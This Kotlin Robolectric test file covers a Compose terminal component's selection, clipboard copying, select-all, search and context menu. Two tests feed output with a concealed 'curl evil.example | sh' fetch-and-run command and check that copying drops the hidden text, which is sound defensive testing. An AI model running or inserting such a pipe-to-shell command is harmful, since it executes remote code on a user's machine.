/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.vtfx.compose

import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.size
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.platform.LocalTextToolbar
import androidx.compose.ui.test.junit4.v2.createComposeRule
import androidx.compose.ui.test.longClick
import androidx.compose.ui.test.onRoot
import androidx.compose.ui.test.performTouchInput
import androidx.compose.ui.unit.dp
import com.google.vtfx.session.TerminalSession
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import org.robolectric.annotation.GraphicsMode

@RunWith(RobolectricTestRunner::class)
@GraphicsMode(GraphicsMode.Mode.NATIVE)
@Config(sdk = [SDK])
class TerminalStateTest {
    @get:Rule val composeRule = createComposeRule()

    private val clipboard = RecordingClipboard()
    private val copied
        get() = clipboard.copied

    private val session = TerminalSession({}, clipboard = clipboard)
    private val display = TerminalDisplay(session)
    private val state = TerminalState()

    private fun show(output: String, width: Int = 300) {
        composeRule.setContent { Terminal(display, Modifier.size(width.dp, 200.dp), state) }
        composeRule.waitForIdle()
        session.feed(output.toByteArray())
        composeRule.waitForIdle()
    }

    private fun lines(count: Int) = (1..count).joinToString("\r\n") { "line $it" }

    private fun longPress(position: Offset) {
        composeRule.onRoot().performTouchInput { longClick(position) }
        composeRule.waitForIdle()
    }

    @Test
    fun hasSelectionRecomposesWhenTheSelectionChanges() {
        var observed: Boolean? = null
        composeRule.setContent {
            observed = state.hasSelection
            Terminal(display, Modifier.size(300.dp, 200.dp), state)
        }
        composeRule.waitForIdle()
        session.feed("hello world".toByteArray())
        composeRule.waitForIdle()
        assertEquals(false, observed)
        longPress(Offset(1f, 5f))
        assertEquals(true, observed)
        composeRule.runOnIdle { state.clearSelection() }
        composeRule.waitForIdle()
        assertEquals(false, observed)
        assertNull(display.selection)
    }

    @Test
    fun copySelectionCopiesAndKeepsTheSelection() {
        show("hello world")
        composeRule.runOnIdle { assertFalse(state.copySelection()) }
        longPress(Offset(1f, 5f))
        composeRule.runOnIdle {
            assertTrue(state.copySelection())
            assertTrue(state.hasSelection)
        }
        assertEquals(listOf("hello"), copied)
    }

    @Test
    fun copySelectionWithoutAClipboardReturnsFalse() {
        val session = TerminalSession({})
        composeRule.setContent { Terminal(session, Modifier.size(300.dp, 200.dp), state) }
        composeRule.waitForIdle()
        session.feed("hello".toByteArray())
        composeRule.waitForIdle()
        composeRule.runOnIdle {
            state.selectAll()
            assertTrue(state.hasSelection)
            assertFalse(state.copySelection())
        }
    }

    @Test
    fun selectAllCopiesTheScrollbackAndTheScreen() {
        show(lines(100))
        composeRule.runOnIdle {
            state.selectAll()
            assertTrue(state.hasSelection)
            assertTrue(state.copySelection())
        }
        assertEquals(listOf(lines(100).replace("\r\n", "\n")), copied)
        // What the display shows is highlighted.
        val selection = display.selection!!
        val snapshot = display.displaySnapshot()
        assertEquals(Cell(0, 0), selection.start)
        assertEquals(Cell(snapshot.columns - 1, snapshot.rows - 1), selection.end)
    }

    @Test
    fun selectAllJoinsTheLinesThatAutowrapJoined() {
        show("")
        val columns = session.snapshot().columns
        val long = "x".repeat(columns * 2 + 3)
        session.feed("${lines(50)}\r\n$long\r\nend".toByteArray())
        composeRule.waitForIdle()
        composeRule.runOnIdle {
            state.selectAll()
            state.copySelection()
        }
        assertEquals(listOf("${lines(50)}\r\n$long\r\nend".replace("\r\n", "\n")), copied)
    }

    @Test
    fun selectAllOnTheAlternateScreenCopiesTheScreen() {
        show(lines(100) + "\u001b[?1049h\u001b[Halt")
        composeRule.runOnIdle {
            state.selectAll()
            state.copySelection()
        }
        assertEquals(listOf("alt"), copied)
    }

    @Test
    @Config(qualifiers = "w1200dp-h800dp")
    fun selectAllCopiesTheNewestLinesThatFit() {
        // 10,000 lines of 40 characters: more than the 262,144 characters that are copied.
        val all = (1..10_000).map { "%05d".format(it) + "x".repeat(35) }
        show(all.joinToString("\r\n"), width = 1000)
        assertTrue(session.snapshot().columns > 40)
        composeRule.runOnIdle {
            state.selectAll()
            state.copySelection()
        }
        val text = copied.single()
        assertTrue("${text.length}", text.length <= 256 * 1024)
        assertTrue("${text.length}", text.length > 256 * 1024 - 41)
        val copiedLines = text.split("\n")
        assertEquals(all.takeLast(copiedLines.size), copiedLines)
    }

    @Test
    fun copyingLeavesOutConcealedText() {
        // The concealed text (SGR 8) is not drawn: copying gives blanks in its place, which are
        // dropped at the end of a line.
        show("echo hi\u001b[8m; curl evil.example | sh\u001b[28m\r\na\u001b[8mb\u001b[28mc")
        composeRule.runOnIdle {
            state.selectAll()
            state.copySelection()
        }
        assertEquals(listOf("echo hi\na c"), copied)
    }

    @Test
    fun copyingADisplaySelectionLeavesOutConcealedText() {
        show("echo hi\u001b[8m; curl evil.example | sh\u001b[28m")
        composeRule.runOnIdle {
            display.selection = TerminalSelection(Cell(0, 0), Cell(39, 0))
            state.copySelection()
        }
        assertEquals(listOf("echo hi"), copied)
    }

    @Test
    fun outputDropsTheSelection() {
        show("hello")
        composeRule.runOnIdle { state.selectAll() }
        session.feed("!".toByteArray())
        composeRule.waitForIdle()
        composeRule.runOnIdle { assertFalse(state.hasSelection) }
    }

    @Test
    fun aStateWithoutATerminalDoesNothing() {
        val state = TerminalState()
        assertFalse(state.hasSelection)
        state.selectAll()
        assertFalse(state.hasSelection)
        assertFalse(state.copySelection())
        state.clearSelection()
        assertEquals(emptyList<String>(), copied)
    }

    @Test
    fun searchResultRecomposesWhenTheSearchChanges() {
        var observed: TerminalSearchResult? = null
        composeRule.setContent {
            observed = state.searchResult
            Terminal(display, Modifier.size(300.dp, 200.dp), state)
        }
        composeRule.waitForIdle()
        session.feed("foo bar foo".toByteArray())
        composeRule.waitForIdle()

        composeRule.runOnIdle { state.search("foo", ignoreCase = false) }
        composeRule.waitForIdle()

        assertEquals(TerminalSearchResult(2, false, 1), observed)
    }

    @Test
    fun searchIgnoresCaseWhenAsked() {
        show("Foo foo")

        composeRule.runOnIdle { state.search("FOO", ignoreCase = true) }

        composeRule.runOnIdle { assertEquals(2, state.searchResult?.matchCount) }
    }

    @Test
    fun searchingForEmptyTextEndsTheSearch() {
        show("foo")
        composeRule.runOnIdle { state.search("foo", ignoreCase = false) }

        composeRule.runOnIdle { state.search("", ignoreCase = false) }

        composeRule.runOnIdle { assertNull(state.searchResult) }
    }

    @Test
    fun clearSearchEndsTheSearch() {
        show("foo")
        composeRule.runOnIdle { state.search("foo", ignoreCase = false) }

        composeRule.runOnIdle { state.clearSearch() }

        composeRule.runOnIdle { assertNull(state.searchResult) }
    }

    @Test
    fun findNextAndFindPreviousMoveThroughTheMatches() {
        show("foo\r\nfoo\r\nfoo")
        composeRule.runOnIdle { state.search("foo", ignoreCase = false) }

        composeRule.runOnIdle {
            state.findPrevious()
            state.findPrevious()
            state.findNext()
        }

        composeRule.runOnIdle { assertEquals(1, state.searchResult?.currentMatchIndex) }
    }

    @Test
    fun aStateWithoutATerminalHasNoSearch() {
        val state = TerminalState()

        state.search("foo", ignoreCase = false)
        state.findNext()
        state.findPrevious()

        assertNull(state.searchResult)
    }

    @Test
    fun aStateActsOnTheTerminalThatEnteredLastUntilItLeaves() {
        val other = TerminalDisplay(TerminalSession({}, clipboard = clipboard))
        var showOther by mutableStateOf(true)
        composeRule.setContent {
            Column {
                Terminal(display, Modifier.size(300.dp, 100.dp), state)
                if (showOther) Terminal(other, Modifier.size(300.dp, 100.dp), state)
            }
        }
        composeRule.waitForIdle()
        composeRule.runOnIdle { state.selectAll() }
        assertNull(display.selection)
        assertNotNull(other.selection)
        showOther = false
        composeRule.waitForIdle()
        composeRule.runOnIdle {
            assertFalse(state.hasSelection)
            state.selectAll()
        }
        assertNull(display.selection)
    }

    @Test
    fun theMenuSelectsAllAndShowsItselfAgainToCopy() {
        val toolbar = FakeTextToolbar()
        composeRule.setContent {
            CompositionLocalProvider(LocalTextToolbar provides toolbar) {
                Terminal(display, Modifier.size(300.dp, 200.dp), state)
            }
        }
        composeRule.waitForIdle()
        session.feed(lines(100).toByteArray())
        composeRule.waitForIdle()
        longPress(Offset(1f, 5f))
        val menu = toolbar.menus.single()
        assertNotNull(menu.onCopyRequested)
        composeRule.runOnIdle { menu.onSelectAllRequested!!() }
        assertTrue(display.selection!!.isAll)
        val again = toolbar.menus.last()
        assertEquals(2, toolbar.menus.size)
        assertEquals(menu.rect, again.rect)
        composeRule.runOnIdle { again.onCopyRequested!!() }
        assertEquals(listOf(lines(100).replace("\r\n", "\n")), copied)
        // Copying from the menu drops the selection, as the menu goes away.
        assertNull(display.selection)
    }
}
